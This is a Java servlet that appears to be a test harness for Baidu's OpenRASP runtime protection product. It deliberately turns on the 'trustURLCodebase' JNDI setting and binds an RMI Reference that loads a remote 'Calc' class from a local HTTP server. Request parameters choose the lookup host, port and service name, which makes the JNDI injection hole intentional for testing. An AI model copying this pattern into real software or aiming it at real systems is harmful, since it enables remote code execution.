package com.baidu.rasp;

import com.baidu.rasp.service.IHello;
import com.baidu.rasp.service.impl.HelloImpl;
import com.baidu.rasp.task.JNDIBadTask;
import com.baidu.rasp.task.JNDITask;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

public class JDNI extends HttpServlet {

    public ExecutorService executor = Executors.newFixedThreadPool(5);

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doPost(req, resp);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        // jdk1.8高版本请设置此属性,否则报如下错误
        // javax.naming.ConfigurationException: The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        resp.setHeader("Content-type", "text/html;charset=UTF-8");//告知浏览器编码方式;
        resp.setCharacterEncoding("UTF-8");
        String option = req.getParameter("option");
        String host = req.getParameter("host");
        if ("".equals(host)){
            host = "localhost";
        }
        int port = Integer.parseInt(req.getParameter("port"));
        String serviceName = req.getParameter("serviceName");
        if ("start".equals(option)){
            IHello service = new HelloImpl();
            Registry registry = LocateRegistry.createRegistry(port);
            registry.rebind(serviceName, service);
            resp.getWriter().println("启动成功");
        }else if ("call".equals(option)){
            String result = JNDITask.CallService(host,port,serviceName);
            resp.getWriter().println(result);
        }else if ("startBad".equals(option)){
            try {
                Registry registry = LocateRegistry.createRegistry(port);
                Reference aa = new Reference("Calc", "Calc", "http://127.0.0.1:8081/");
                ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);
                registry.rebind(serviceName, refObjWrapper);
                resp.getWriter().println("启动成功");
            } catch (Exception e) {
                e.printStackTrace();
                resp.getWriter().println("启动失败："+e.getMessage());
            }
        }else if ("callBad".equals(option)){
            String result = JNDIBadTask.CallBadService(host,port,serviceName);
            resp.getWriter().println(result);
        }else if ("asyncCallJDNI".equals(option)){
            Future<String> f = executor.submit(new JNDITask(host,port,serviceName));
            try {
                String result = f.get();
                resp.getWriter().println("（异步）" + result);
            } catch (Exception e) {
                e.printStackTrace();
                resp.getWriter().println(e.getMessage());
            }
        }else if ("asyncCallBadJDNI".equals(option)){
            Future<String> f = executor.submit(new JNDIBadTask(host,port,serviceName));
            try {
                String result = f.get();
                resp.getWriter().println("（异步）" + result);
            } catch (Exception e) {
                e.printStackTrace();
                resp.getWriter().println(e.getMessage());
            }
        }
    }
}